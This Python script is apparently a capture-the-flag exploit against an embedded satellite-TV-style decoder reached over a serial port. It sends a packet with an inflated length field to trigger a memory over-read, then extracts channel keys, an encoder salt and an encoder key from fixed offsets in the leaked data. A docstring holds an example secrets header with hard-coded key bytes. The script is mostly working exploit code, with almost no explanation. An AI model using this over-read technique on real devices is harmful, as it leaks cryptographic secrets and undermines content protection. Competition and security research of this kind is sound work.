#!/usr/bin/env python3

# example era secrets header
"""
#ifndef SECRETS_H
#define SECRETS_H
#define NUM_CHANNELS 5

uint32_t channels_numbers[NUM_CHANNELS] = {
0,
1,
2,
3,
4,
};

uint8_t channels_keys[][33] = {
    { 0x37, 0x39, 0x37, 0x38, 0x36, 0x62, 0x39, 0x63, 0x33, 0x66, 0x63, 0x33, 0x38, 0x31, 0x33, 0x31, 0x64, 0x63, 0x61, 0x63, 0x61, 0x61, 0x34, 0x64, 0x61, 0x38, 0x65, 0x64, 0x39, 0x34, 0x30, 0x61, 0x00 }, // Channel 0
    { 0x38, 0x30, 0x30, 0x34, 0x38, 0x65, 0x66, 0x61, 0x64, 0x65, 0x65, 0x35, 0x38, 0x34, 0x33, 0x62, 0x37, 0x34, 0x33, 0x38, 0x39, 0x36, 0x35, 0x30, 0x39, 0x35, 0x61, 0x33, 0x38, 0x31, 0x35, 0x37, 0x00 }, // Channel 1
    { 0x34, 0x63, 0x62, 0x37, 0x35, 0x37, 0x30, 0x34, 0x35, 0x31, 0x32, 0x63, 0x36, 0x66, 0x36, 0x65, 0x62, 0x34, 0x30, 0x39, 0x66, 0x34, 0x37, 0x65, 0x30, 0x30, 0x62, 0x64, 0x30, 0x39, 0x63, 0x31, 0x00 }, // Channel 2
    { 0x62, 0x36, 0x32, 0x39, 0x38, 0x34, 0x35, 0x61, 0x62, 0x32, 0x30, 0x66, 0x37, 0x64, 0x62, 0x65, 0x39, 0x37, 0x31, 0x39, 0x30, 0x62, 0x66, 0x34, 0x66, 0x39, 0x66, 0x39, 0x61, 0x31, 0x39, 0x37, 0x00 }, // Channel 3
    { 0x37, 0x33, 0x33, 0x36, 0x39, 0x37, 0x65, 0x65, 0x39, 0x33, 0x62, 0x32, 0x31, 0x64, 0x63, 0x64, 0x34, 0x37, 0x65, 0x32, 0x35, 0x32, 0x33, 0x64, 0x30, 0x36, 0x66, 0x62, 0x63, 0x34, 0x32, 0x32, 0x00 }, // Channel 4
};

uint8_t ENCODERS_SALT[] = { 0x32, 0x38, 0x64, 0x61, 0x35, 0x62, 0x61, 0x38, 0x64, 0x38, 0x39, 0x61, 0x32, 0x34, 0x65, 0x38, 0x00 };
uint8_t DECODERS_SALT[] = { 0x37, 0x37, 0x66, 0x63, 0x63, 0x38, 0x39, 0x64, 0x31, 0x61, 0x32, 0x63, 0x32, 0x66, 0x30, 0x37, 0x00 };
uint8_t ENCODER_KEY[] = { 0x64, 0x38, 0x35, 0x65, 0x64, 0x63, 0x65, 0x36, 0x31, 0x33, 0x38, 0x31, 0x34, 0x32, 0x35, 0x65, 0x35, 0x35, 0x61, 0x35, 0x62, 0x65, 0x38, 0x63, 0x37, 0x64, 0x34, 0x34, 0x31, 0x32, 0x30, 0x32 };
uint8_t SUB_KEY[] = { 0x61, 0x33, 0x62, 0x33, 0x62, 0x38, 0x34, 0x37, 0x65, 0x38, 0x65, 0x65, 0x38, 0x31, 0x32, 0x63, 0x38, 0x62, 0x32, 0x62, 0x35, 0x33, 0x32, 0x62, 0x38, 0x31, 0x65, 0x36, 0x37, 0x36, 0x64, 0x35 };

#endif // SECRETS_H
"""

from pwn import *
from decoder import DecoderIntf

context.arch = 'arm'

def conn():
    r = DecoderIntf('/dev/ttyACM0')

    return r


def main():
    r = conn()

    packet = b"<\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00f\x9d\xe3\x97\x16\xab>\r\\\x89\x1f\xc1N\xef\x1dvdP\x152A\xbf'\xa2\x1d\x14\xd2\xe6\x9bQt]\xc0\n\xb6&\xb0 c\xef\xda(\x8b\xb6\xbd\x81\xe4\xe6H\xecf\x04\xc4\xb0\x97\xee\x8d\x8c\xad\x85\xc9\xa7\x1c<"
    packet_len = 7

    def altered_len(length):
        return packet[0:8] + p32(packet_len + length) + packet[12:]

    leak = r.decode(altered_len(0x700))
    print(leak)

    channel_key_offset = 152
    encoder_salt_offset = 186
    encoder_key_offset = 1288

    channel_key = leak[channel_key_offset:channel_key_offset + 0x20]
    encoder_salt = leak[encoder_salt_offset:encoder_salt_offset + 0x10]
    encoder_key = leak[encoder_key_offset:encoder_key_offset + 0x20]

    print(f'{channel_key = }')
    print(f'{encoder_salt = }')
    print(f'{encoder_key = }')



    # print(r.list())
    # b = r.subscribe(b'example')
    # a = r.decode(b'example')



if __name__ == "__main__":
    main()
